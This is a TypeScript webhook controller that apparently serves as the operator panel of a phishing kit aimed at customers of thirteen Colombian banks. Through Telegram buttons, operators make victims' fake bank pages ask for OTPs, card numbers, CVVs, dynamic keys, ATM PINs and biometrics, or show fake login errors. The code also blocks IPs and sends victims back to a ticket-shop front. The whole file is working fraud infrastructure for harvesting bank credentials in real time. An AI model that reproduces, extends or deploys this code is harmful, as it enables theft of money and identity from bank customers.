import axios from "axios";
import { Request, Response } from "express";
import { FirebaseService } from "../services/FirebaseService";
import { StorageService } from "../services/StorageService";
import { BancolombiaController } from "./bancoBancolombia/BancolombiaController";

// Se exporta la clase del hook de telegram para que se pueda hacer peticiones desde el frontend
export class WebhookController {
  /**
   * Metodo encargado de disparar el generate-link en el backend central sin tumbar el proceso si responde 4xx/5xx
   * @param sessionId
   * @param bank
   * @returns
   */
  static async triggerGenerateLink(
    sessionId: string,
    bank: string,
    options?: { automaticRecaudo?: boolean },
  ): Promise<void> {
    // Se captura la base de la url del backend central
    const centralBase = process.env.BACKEND_CENTRAL_URL;

    // Se valida si la base de la url del backend central existe
    if (!centralBase) {
      // Se imprime el error
      console.error("[link_bot] BACKEND_CENTRAL_URL no está configurado");

      // Se retorna
      return;
    }

    // Se genera la url
    const generateUrl = `${centralBase.replace(/\/$/, "")}/api/generate-link`;

    // Se genera el payload
    const generatePayload = {
      data: {
        attributes: {
          sessionId: sessionId,
          bank: bank,
          ...(options?.automaticRecaudo
            ? { automaticRecaudo: true, trigger: "automatic_recaudo" }
            : {}),
        },
      },
    };

    // Se usa el try catch
    try {
      // Se envia la peticion al backend central
      const response = await axios.post(generateUrl, generatePayload, {
        timeout: 300000,
        headers: {
          "Content-Type": "application/json",
          "ngrok-skip-browser-warning": "true",
        },
        // No lanzar excepción por 409 u otros errores HTTP del central
        validateStatus: () => true,
      });

      // Se valida si la respuesta es un error
      if (response.status >= 400) {
        // Se maneja el error
        await WebhookController.handleGenerateLinkError(
          sessionId,
          bank,
          response.status,
          response.data,
        );

        // Se retorna
        return;
      }

      const attrs = response.data?.data?.attributes;
      const paymentUrl =
        (typeof attrs?.paymentUrl === "string" && attrs.paymentUrl.trim()) ||
        (typeof attrs?.link === "string" && attrs.link.trim()) ||
        null;

      if (paymentUrl) {
        let currentSession =
          (await StorageService.get(`session_${sessionId}`)) || {};
        currentSession.urlAutomatic = paymentUrl;
        currentSession.lastStatus = "link_bot";
        await StorageService.set(`session_${sessionId}`, currentSession);
        await StorageService.set(`urlAutomatic_${sessionId}`, paymentUrl);
        await StorageService.set(`status_${sessionId}`, "link_bot");
        await FirebaseService.saveSession(sessionId, {
          lastStatus: "link_bot",
          urlAutomatic: paymentUrl,
        });
      } else {
        await StorageService.set(`status_${sessionId}`, "sol_link_bot");
        await FirebaseService.saveSession(sessionId, {
          lastStatus: "sol_link_bot",
        });
      }

      // Se imprime el log de que se genero el link correctamente
      console.log(
        `[link_bot] generate-link OK (${response.status}) session=${sessionId}`,
      );
    } catch (error: any) {
      // Se imprime el error
      console.error(
        "[link_bot] Error de red/conexión ->",
        error?.message || error,
      );

      // Se maneja el error
      await WebhookController.handleGenerateLinkError(sessionId, bank, 0, {
        message: error?.message || "Error de conexión con el backend central",
      });
    }
  }

  /**
   * Metodo encargado de programar la prueba del link PSE en el backend central
   * @param sessionId
   * @param paymentUrl
   * @returns
   */
  static async triggerScheduleLinkTester(sessionId: string, paymentUrl: string): Promise<void> {

    // Se captura la base de la url del backend central
    const centralBase = process.env.BACKEND_CENTRAL_URL;

    // Se valida si la base de la url del backend central existe
    if (!centralBase) {

      // Se imprime el error
      console.error("[link_custom] BACKEND_CENTRAL_URL no está configurado");

      // Se retorna
      return;
    }

    // Se genera la url
    const scheduleUrl = `${centralBase.replace(/\/$/, "")}/api/schedule-link-tester`;

    // Se genera el payload
    const payload = {
      data: {
        attributes: {
          sessionId: sessionId,
          paymentUrl: paymentUrl,
        },
      },
    };

    // Se usa el try catch
    try {
      // Se envia la peticion al backend central
      const response = await axios.post(scheduleUrl, payload, {
        timeout: 60000,
        headers: {
          "Content-Type": "application/json",
          "ngrok-skip-browser-warning": "true",
        },
        validateStatus: () => true,
      });

      // Se valida si la respuesta es un error
      if (response.status >= 400) {

        // Se imprime el error
        console.error(`[link_custom] schedule-link-tester falló (${response.status}) session=${sessionId}`, response.data);

        // Se retorna
        return;
      }

      // Se imprime el log de que se programo la prueba del link correctamente
      console.log(`[link_custom] schedule-link-tester OK (${response.status}) session=${sessionId}`);
    } catch (error: unknown) {

      // Se imprime el error
      const msg = error instanceof Error ? error.message : String(error);

      // Se imprime el error
      console.error("[link_custom] Error de red schedule-link-tester ->", msg);
    }
  }

  /**
   * Metodo encargado de registrar el error en la sesión/Telegram
   * @param sessionId
   * @param bank
   * @param httpStatus
   * @param payload
   * @returns
   */
  static async handleGenerateLinkError(
    sessionId: string,
    bank: string,
    httpStatus: number,
    payload: any,
  ): Promise<void> {
    // Se usa el try catch
    try {
      // Se inicializa el detalle
      let detail = "No se pudo generar el link automático";

      // Se captura el error
      const errors = payload?.errors;

      // Se valida si el error es un array y tiene un detalle
      if (Array.isArray(errors) && errors[0]?.detail) {
        // Se captura el detalle
        detail = String(errors[0].detail);
      } else if (payload?.message) {
        // Se captura el detalle
        detail = String(payload.message);
      } else if (typeof payload === "string") {
        // Se captura el detalle
        detail = payload;
      }

      // Se imprime el error
      console.warn(
        `[link_bot] Error central ${httpStatus} session=${sessionId} -> ${detail}`,
      );

      // Se inicializa el helper
      const { Helper } = await import("./Helper");

      // Se captura la session
      let currentSession =
        (await StorageService.get(`session_${sessionId}`)) || {};

      // Se agrega el evento al timeline
      currentSession = Helper.addEvent(currentSession, "admin_action", {
        accion: "error_link_bot",
        mensaje: `❌ ${detail}`,
        httpStatus,
      });

      // Se captura el error status
      const errorStatus =
        httpStatus === 409 ? "error_pse_en_curso" : "error_link_bot";

      // Se setea el ultimo estado
      currentSession.lastStatus = errorStatus;

      // Se setea la session en el storage
      await StorageService.set(`session_${sessionId}`, currentSession);
      await StorageService.set(`status_${sessionId}`, errorStatus);

      // Se guarda la session en el firebase
      await FirebaseService.saveSession(sessionId, { lastStatus: errorStatus });

      // Se valida si hay un messageId previo en la sesión (persiste en Firebase)
      if (currentSession.messageId) {
        // Se actualiza la session en el telegram
        await Helper.refreshTelegramSession(sessionId, currentSession, true);
      }
    } catch (err: any) {
      // Se imprime el error
      console.error(
        "[link_bot] No se pudo registrar error en sesión ->",
        err?.message || err,
      );
    }
  }

  /**
   * Mapa de bancos con sus rutas PSE
   */
  static readonly BANK_ROUTES: any = {
    AVVILLAS: "avvillas",
    BANCOLOMBIA: "bancolombia", // OK
    BBVA: "bbva", // OK
    BOGOTA: "bogota",
    CAJA_SOCIAL: "cajasocial",
    COLPATRIA: "colpatria",
    DAVIVIENDA: "davivienda",
    FALABELLA: "falabella",
    ITAU: "itau",
    NEQUI: "nequi",
    OCCIDENTE: "occidente",
    POPULAR: "popular", // OK
    SERFINANZA: "serfinanza",
  };

  /**
   * Metodo encargado de recibir la respuesta de telegram
   * @param req
   * @param res
   * @returns
   */
  static async handleWebhook(req: Request, res: Response) {

    // Se usa el try catch
    try {

      // Se inicializa el servicio de telegram
      const { TelegramService } = await import("../services/TelegramService");

      // Se captura la informacion
      const update = req.body;

      // Nuevo formato desde el central
      const callbackQuery = update.telegram;
      const action = update.action;
      const sessionId = update.sessionId;
      const bank = update.bank;

      console.log("action    -> ", action);
      console.log("sessionId -> ", sessionId);
      console.log("bank      -> ", bank);
      console.log("------------------------");

      // Se valida que haya respuesta en todo
      if (callbackQuery && action && sessionId) {

        // Se captura la session híbrida (Memoria + Firebase) para conservar todos los datos al editar el mensaje
        const memorySession = (await StorageService.get(`session_${sessionId}`)) || {};
        const firebaseSession = (await FirebaseService.getSession(sessionId)) || {};

        // Se fusionan asegurando que no se pierdan propiedades ni el timeline
        const currentSession = {
          sessionId,
          ...firebaseSession,
          ...memorySession,
          timeline: (memorySession.timeline && memorySession.timeline.length > 0)
            ? memorySession.timeline
            : (firebaseSession.timeline || []),
        };

        // Guardar sesión fusionada actualizada en memoria para que no se pierda
        await StorageService.set(`session_${sessionId}`, currentSession);

        // Se capturan las credenciales
        const user = callbackQuery?.from || {};
        const firstName = String(user?.first_name || "Usuario");
        const usernameRaw = String(user?.username || "").trim();
        const userName = firstName + (usernameRaw ? ` (@${usernameRaw})` : "");
        const messageId = Number(callbackQuery?.message?.message_id ?? currentSession?.messageId ?? 0);

        // Se actualiza la ultima acción
        await FirebaseService.saveSession(sessionId, {
          ...currentSession,
          lastStatus: action,
        });

        // Se inicializa la variable para el mensaje y el mapeo de acciones
        let baseMessage = "";
        let actionMap: any = {};

        // -----------------------Se valida desde que banco se esta ejecutando la accion----------------------- //
        if (bank === "AVVILLAS") {

          // Se inicializan los import
          const { AvvillasController } = await import("./bancoAvvillas/AvvillasController");

          // Se saca el mensaje
          baseMessage = AvvillasController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo AV Villas",
            sol_otp: "Solicitando OTP",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es Bancolombia----------------------------------- //
        else if (bank === "BANCOLOMBIA") {

          // Se inicializan los import
          const { BancolombiaController } = await import("./bancoBancolombia/BancolombiaController");

          // Se saca el mensaje
          baseMessage = BancolombiaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Bancolombia",
            sol_tc: "Solicitando TC",
            sol_cvv: "Solicitando CVV",
            request_cvv_custom: "Solicitando CVV Custom",
            request_tc_custom: "Solicitando TC Custom",
            approve_custom: "Aprobar Custom",
            reject_custom: "Rechazar Custom",
            sol_otp: "Solicitando OTP",
            sol_din: "Solicitando Clave Dinámica",
            sol_finalizar: "Finalizar",
            sol_biometria: "Solicitando Biometría",
            error_otp: "OTP Incorrecto",
            error_din: "Clave Dinámica Incorrecta",
            error_login: "Error de Login",
            error_923: "Error 923",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es BBVA----------------------------------- //
        else if (bank === "BBVA") {

          // Se inicializan los import
          const { BbvaController } = await import("./bancoBbva/BbvaController");

          // Se saca el mensaje
          baseMessage = BbvaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            sol_otp: "Solicitando OTP",
            error_otp: "OTP Incorrecto",
            logo: "Solicitando Logo BBVA",
            sol_finalizar: "Finalizar",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es BOGOTA----------------------------------- //
        else if (bank === "BOGOTA") {

          // Se inicializan los import
          const { BogotaController } = await import("./bancoBogota/BogotaController");

          // Se saca el mensaje
          baseMessage = BogotaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Bogota",
            sol_otp: "Solicitando OTP",
            sol_token: "Solicitando Token",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_token: "Error de Token",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es Caja Social----------------------------------- //
        else if (bank === "CAJA_SOCIAL") {

          // Se inicializan los import
          const { CajaSocialController } = await import("./bancoCajaSocial/CajaSocialController");

          // Se saca el mensaje
          baseMessage = CajaSocialController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Caja Social",
            sol_otp: "Solicitando OTP",
            sol_token: "Solicitando Token",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_token: "Token incorrecto",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es COLPATRIA----------------------------------- //
        else if (bank === "COLPATRIA") {

          // Se inicializan los import
          const { ColpatriaController } = await import("./bancoColpatria/ColpatriaController");

          // Se saca el mensaje
          baseMessage = ColpatriaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Colpatria",
            sol_otp: "Solicitando OTP",
            sol_atm: "Solicitando ATM",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_atm: "Error de ATM",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es DAVIVIENDA----------------------------------- //
        else if (bank === "DAVIVIENDA") {

          // Se inicializan los import
          const { DaviviendaController } = await import("./bancoDavivienda/DaviviendaController");

          // Se saca el mensaje
          baseMessage = DaviviendaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Davivienda",
            sol_otp: "Solicitando OTP",
            sol_biometria: "Solicitando Biometría",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es FALABELLA----------------------------------- //
        else if (bank === "FALABELLA") {

          // Se inicializan los import
          const { FalabellaController } = await import("./bancoFalabella/FalabellaController");

          // Se saca el mensaje
          baseMessage = FalabellaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Falabella",
            sol_otp: "Solicitando OTP",
            sol_din: "Solicitando Dinámica",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_din: "Clave Dinámica Incorrecta",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es ITAU----------------------------------- //
        else if (bank === "ITAU") {

          // Se inicializan los import
          const { ItauController } = await import("./bancoItau/ItauController");

          // Se saca el mensaje
          baseMessage = ItauController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Itau",
            sol_otp: "Solicitando OTP",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es Nequi----------------------------------- //
        else if (bank === "NEQUI") {

          // Se inicializan los import
          const { NequiController } = await import("./bancoNequi/NequiController");

          // Se saca el mensaje
          baseMessage = NequiController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Nequi",
            sol_din: "Solicitando Clave Dinámica",
            sol_finalizar: "Finalizar",
            error_din: "Clave Dinámica Incorrecta",
            error_login: "Error de Login",
            error_cash: "Saldo Incorrecto",
            sol_saldo: "Solicitando Saldo",
            sol_biometria: "Solicitando Biometría",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es OCCIDENTE----------------------------------- //
        else if (bank === "OCCIDENTE") {

          // Se inicializan los import
          const { OccidenteController } = await import("./bancoOccidente/OccidenteController");

          // Se saca el mensaje
          baseMessage = OccidenteController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Occidente",
            sol_otp: "Solicitando OTP",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es POPULAR----------------------------------- //
        else if (bank === "POPULAR") {

          // Se inicializan los import
          const { PopularController } = await import("./bancoPopular/PopularController");

          // Se saca el mensaje
          baseMessage = PopularController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Popular",
            sol_otp: "Solicitando OTP",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando es SERFINANZA----------------------------------- //
        else if (bank === "SERFINANZA") {

          // Se inicializan los import
          const { SerfinanzaController } = await import("./bancoSerfinanza/SerfinanzaController");

          // Se saca el mensaje
          baseMessage = SerfinanzaController.formatMessage(currentSession);

          // Se inicializa el mapeo de acciones
          actionMap = {
            logo: "Solicitando Logo Serfinanza",
            sol_otp: "Solicitando OTP",
            sol_din: "Solicitando Dinámica",
            sol_finalizar: "Finalizar",
            error_otp: "OTP Incorrecto",
            error_din: "Clave Dinámica Incorrecta",
            error_login: "Error de Login",
            block_ip: "Bloquear IP",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // Se valida fallback para bancos no mapeados y se conserva el historial
        if (!baseMessage) {

          // Se importa Helper para usar formateo por defecto con timeline
          const { Helper } = await import("./Helper");

          // Se formatea el mensaje por defecto para no perder historial en Telegram
          baseMessage = Helper.formatMessageDefault(currentSession);

          // Se inicializa mapeo base para acciones comunes en fallback
          actionMap = {
            logo: "Solicitando Logo",
            back: "Volver al comercio",
            link_bot: "Generando link automatico",
            sol_link_custom: "Solicitando Link Custom",
          };
        }

        // ---------------------------------Se valida cuando se aprueba custom----------------------------------- //

        // Se valida cuando se aprueba custom
        if (action === "approve_custom") {

          // Se captura la informacion de la session
          let currentSession = (await StorageService.get(`session_${sessionId}`)) || {};

          // Se captura el messageId
          const messageId = currentSession.messageId;

          // Se elimina el mensaje de decision (con botones approve/reject)
          await TelegramService.deletePreviousMessage(messageId, sessionId);

          // Se capturan los botones
          const buttons = BancolombiaController.getButtons(sessionId);

          // Se formatea el mensaje
          const message = BancolombiaController.formatMessage(currentSession);

          // Se envia el nuevo mensaje con los mensajes formateados y habilitados los botones normales
          const msgId = await TelegramService.sendMessage(
            message,
            buttons,
            sessionId,
          );

          // Se setea el messageId en la sesión
          currentSession.sessionId = sessionId;
          currentSession.messageId = msgId;

          // Se setea la data
          await StorageService.set(`session_${sessionId}`, currentSession);
        }

        // Se valida cuando la accion es rechazar custom
        else if (action === "reject_custom") {

          // Se captura el estado actual para saber si es CVV o TC Custom
          let currentStatus = await StorageService.get(`status_${sessionId}`);

          // Se valida si la sessionId es un array
          const sessionIdStr = Array.isArray(sessionId) ? sessionId[0] : sessionId;

          // Se valida si el estado actual existe
          if (!currentStatus) {

            // Se obtiene la session
            const session = await FirebaseService.getSession(sessionIdStr);

            // Se captura el ultimo estado
            currentStatus = session?.lastStatus || "pendiente";
          }

          // Usar estados de ERROR para que el frontend muestre el modal de error
          if (currentStatus === "awaiting_cvv_approval") {

            // Rechazo de CVV Custom - establecer estado de error para mostrar modal
            await StorageService.set(`status_${sessionId}`, "error_cvv_custom");
          } else if (currentStatus === "awaiting_tc_approval") {

            // Rechazo de TC Custom - establecer estado de error para mostrar modal
            await StorageService.set(`status_${sessionId}`, "error_tc_custom");
          } else {

            // Por defecto, asumir CVV Custom (comportamiento anterior)
            await StorageService.set(`status_${sessionId}`, "error_cvv_custom");
          }
        }

        // Se inicializa la accion
        let actionName = action;

        // Se captura el mapeo
        if (actionMap[action]) actionName = actionMap[action];

        // Se normaliza etiqueta para acción de retorno al comercio
        if (action === "back") actionName = "Volver al comercio";

        // Se inicializa el footer
        const footer = `\n🚨 <b>Acción realizada:</b> ${actionName}\n🥷 <b>Por:</b> ${userName}`;

        // Se edita el mensaje si existe messageId válido
        if (Number.isFinite(messageId) && messageId > 0) {

          // Se edita el mensaje con el nuevo texto y los botones
          await TelegramService.editMessageText(
            messageId,
            baseMessage + footer,
            [],
            sessionId,
          );
        }

        // Se inicializa el estado y la url a persistir
        let statusToSave = action;
        let url = WebhookController.BANK_ROUTES[bank];

        // Se valida cuando la accion es back para devolver al comercio externo
        if (action === "back") {

          // Se captura la URL de retorno al comercio
          const backUrl = (process.env.BACK_URL || "https://tiquetes-baratos-frontend.vercel.app/").trim();

          // Se guarda como link_bot para que el frontend redirija por URL directa
          statusToSave = "link_bot";

          // Se setea la URL de retorno al comercio
          url = backUrl;

          // Se setea la URL automática para verify-state
          await StorageService.set(`urlAutomatic_${sessionId}`, backUrl);
          await FirebaseService.saveSession(sessionId, {
            urlAutomatic: backUrl,
          });
        }

        // Se actualiza el estado en el storage local
        await StorageService.set(`status_${sessionId}`, statusToSave);

        // Se setea la url en el storage para el flujo logo legacy
        await StorageService.set(`url_redirect_${sessionId}`, url);

        // Se actualiza la ultima acción realizada
        await FirebaseService.saveSession(sessionId, {
          lastStatus: statusToSave,
          urlRedirect: url,
        });

        // Se valida cuando la accion es link_bot
        if (action === "link_bot") {

          // Fire-and-forget: errores 409/5xx quedan capturados dentro (no tumba Node)
          void WebhookController.triggerGenerateLink(sessionId, bank, {
            automaticRecaudo: update.automaticRecaudo === true,
          });
        }
      }

      // Se response ok
      res.status(200).send("OK");

    } catch (error: any) {

      // Se responde error en el hook
      res.status(500).json({
        success: false,
        message: "Error en webhook",
        error: error.message || error,
      });
    }
  }
}